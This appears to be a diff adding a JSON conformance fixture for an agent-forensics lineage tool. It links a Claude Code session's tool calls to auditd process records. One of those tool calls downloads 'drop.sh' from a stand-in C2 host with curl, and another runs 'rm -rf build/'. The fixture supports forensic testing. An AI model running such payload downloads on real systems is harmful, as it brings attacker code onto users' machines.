@@ -1,0 +1,243 @@
+{
+  "adfir_spec": "0.2.2",
+  "case_id": "CONFORMANCE-ANALYSIS",
+  "edges": [
+    {
+      "basis": "recorded agent id on the tool call",
+      "evidence_state": "CORROBORATED",
+      "from": "agent:main:cccccccc-0001-4000-8000-000000000001",
+      "limitations": [
+        "evidence_state is the corroboration of the recorded step this edge belongs to; the edge's own references cite the agent's record, not the witness that corroborated the step"
+      ],
+      "relation": "invoked",
+      "source_refs": [],
+      "to": "tool:evt-000001"
+    },
+    {
+      "basis": "recorded agent id on the tool call",
+      "evidence_state": "CORROBORATED",
+      "from": "agent:main:cccccccc-0001-4000-8000-000000000001",
+      "limitations": [
+        "evidence_state is the corroboration of the recorded step this edge belongs to; the edge's own references cite the agent's record, not the witness that corroborated the step"
+      ],
+      "relation": "invoked",
+      "source_refs": [
+        {
+          "artifact_id": "ca2fc4a985c433c3a529b7525660639ff8d0fe650a50b9c70f7bf4b9d4e637ea",
+          "event_id": "evt-000003",
+          "line": 4,
+          "logical_path": ".claude/projects/-home-dev-app/session.jsonl",
+          "offset": 942
+        }
+      ],
+      "to": "tool:evt-000003"
+    },
+    {
+      "basis": "human prompt recorded in this agent's transcript; transcript stored under profile .claude; no login file for it in the case",
+      "evidence_state": "OBSERVED",
+      "from": "human:.claude",
+      "note": "1 human prompt(s) in scope",
+      "relation": "prompted",
+      "source_refs": [
+        {
+          "artifact_id": "ca2fc4a985c433c3a529b7525660639ff8d0fe650a50b9c70f7bf4b9d4e637ea",
+          "event_id": "evt-000000",
+          "line": 1,
+          "logical_path": ".claude/projects/-home-dev-app/session.jsonl"
+        }
+      ],
+      "to": "agent:main:cccccccc-0001-4000-8000-000000000001"
+    },
+    {
+      "basis": "destination named in the recorded command",
+      "evidence_state": "CORROBORATED",
+      "from": "tool:evt-000001",
+      "limitations": [
+        "the recorded command names this destination; it does not show that a connection was made",
+        "evidence_state is the corroboration of the recorded step this edge belongs to; the edge's own references cite the agent's record, not the witness that corroborated the step"
+      ],
+      "note": "the command names it; a connection is shown only by a telemetry edge",
+      "relation": "named_destination",
+      "source_refs": [
+        {
+          "artifact_id": "ca2fc4a985c433c3a529b7525660639ff8d0fe650a50b9c70f7bf4b9d4e637ea",
+          "event_id": "evt-000001",
+          "line": 2,
+          "logical_path": ".claude/projects/-home-dev-app/session.jsonl",
+          "offset": 256
+        }
+      ],
+      "to": "network:c2.conformance.example"
+    },
+    {
+      "basis": "correlated within ±3s: same command line (endpoint, score 100)",
+      "confidence": "HIGH",
+      "evidence_state": "CORROBORATED",
+      "from": "tool:evt-000001",
+      "limitations": [
+        "paired by a correlation (time window and matching fields), not by an identifier both records carry; its basis and score are in basis"
+      ],
+      "note": "record is +300ms from the transcript time",
+      "relation": "executed_as",
+      "source_refs": [
+        {
+          "artifact_id": "ca2fc4a985c433c3a529b7525660639ff8d0fe650a50b9c70f7bf4b9d4e637ea",
+          "event_id": "evt-000001",
+          "line": 2,
+          "logical_path": ".claude/projects/-home-dev-app/session.jsonl",
+          "offset": 256
+        },
+        {
+          "telemetry_ref": "auditd audit.log:1 (serial 101)"
+        }
+      ],
+      "to": "process:auditd:audit.log:1 (serial 101)"
+    },
+    {
+      "basis": "correlated within ±3s: same command line (endpoint, score 100)",
+      "confidence": "HIGH",
+      "evidence_state": "CORROBORATED",
+      "from": "tool:evt-000003",
+      "limitations": [
+        "paired by a correlation (time window and matching fields), not by an identifier both records carry; its basis and score are in basis"
+      ],
+      "note": "record is +300ms from the transcript time",
+      "relation": "executed_as",
+      "source_refs": [
+        {
+          "artifact_id": "ca2fc4a985c433c3a529b7525660639ff8d0fe650a50b9c70f7bf4b9d4e637ea",
+          "event_id": "evt-000003",
+          "line": 4,
+          "logical_path": ".claude/projects/-home-dev-app/session.jsonl",
+          "offset": 942
+        },
+        {
+          "telemetry_ref": "auditd audit.log:3 (serial 102)"
+        }
+      ],
+      "to": "process:auditd:audit.log:3 (serial 102)"
+    }
+  ],
+  "limits": {
+    "max_edges": 50000,
+    "max_nodes": 20000
+  },
+  "nodes": [
+    {
+      "attributes": {
+        "profile": ".claude"
+      },
+      "id": "human:.claude",
+      "kind": "human",
+      "label": "Claude Code · profile ~/.claude (login not recorded)"
+    },
+    {
+      "attributes": {
+        "product": "claude-code",
+        "session_id": "cccccccc-0001-4000-8000-000000000001"
+      },
+      "id": "agent:main:cccccccc-0001-4000-8000-000000000001",
+      "kind": "agent",
+      "label": "main:cccccccc-0001-4000-8000-000000000001"
+    },
+    {
+      "attributes": {
+        "action": "shell_execution",
+        "command": "curl -s https://c2.conformance.example/drop.sh -o /tmp/drop.sh",
+        "session_id": "cccccccc-0001-4000-8000-000000000001",
+        "timestamp": "2026-09-20T10:00:02Z",
+        "tool": "Bash",
+        "tool_call_id": "toolu_cccccccc_0002"
+      },
+      "evidence_state": "CORROBORATED",
+      "id": "tool:evt-000001",
+      "kind": "tool_call",
+      "label": "Bash: curl -s https://c2.conformance.example/drop.sh -o /tmp/drop.…",
+      "source_refs": [
+        {
+          "artifact_id": "ca2fc4a985c433c3a529b7525660639ff8d0fe650a50b9c70f7bf4b9d4e637ea",
+          "event_id": "evt-000001",
+          "line": 2,
+          "logical_path": ".claude/projects/-home-dev-app/session.jsonl",
+          "offset": 256
+        }
+      ]
+    },
+    {
+      "attributes": {
+        "action": "shell_execution",
+        "command": "rm -rf build/",
+        "session_id": "cccccccc-0001-4000-8000-000000000001",
+        "timestamp": "2026-09-20T10:00:05Z",
+        "tool": "Bash",
+        "tool_call_id": "toolu_cccccccc_0004"
+      },
+      "evidence_state": "CORROBORATED",
+      "id": "tool:evt-000003",
+      "kind": "tool_call",
+      "label": "Bash: rm -rf build/",
+      "source_refs": [
+        {
+          "artifact_id": "ca2fc4a985c433c3a529b7525660639ff8d0fe650a50b9c70f7bf4b9d4e637ea",
+          "event_id": "evt-000003",
+          "line": 4,
+          "logical_path": ".claude/projects/-home-dev-app/session.jsonl",
+          "offset": 942
+        }
+      ]
+    },
+    {
+      "attributes": {
+        "cmdline": "curl -s https://c2.conformance.example/drop.sh -o /tmp/drop.sh",
+        "exe": "/usr/bin/curl",
+        "pid": "4411",
+        "ppid": "1",
+        "time": "2026-09-20T10:00:02Z",
+        "user": "1000"
+      },
+      "evidence_state": "OBSERVED",
+      "id": "process:auditd:audit.log:1 (serial 101)",
+      "kind": "process",
+      "label": "curl (pid 4411)",
+      "source_refs": [
+        {
+          "telemetry_ref": "auditd audit.log:1 (serial 101)"
+        }
+      ]
+    },
+    {
+      "attributes": {
+        "cmdline": "rm -rf build/",
+        "exe": "/bin/rm",
+        "pid": "4412",
+        "ppid": "1",
+        "time": "2026-09-20T10:00:05Z",
+        "user": "1000"
+      },
+      "evidence_state": "OBSERVED",
+      "id": "process:auditd:audit.log:3 (serial 102)",
+      "kind": "process",
+      "label": "rm (pid 4412)",
+      "source_refs": [
+        {
+          "telemetry_ref": "auditd audit.log:3 (serial 102)"
+        }
+      ]
+    },
+    {
+      "id": "network:c2.conformance.example",
+      "kind": "network",
+      "label": "c2.conformance.example"
+    }
+  ],
+  "notes": [],
+  "omitted": {
+    "edges": 0,
+    "nodes": 0
+  },
+  "schema": "agentdfir.lineage/1",
+  "scope": {
+    "events_considered": 5
+  },
+  "truncated": false
+}
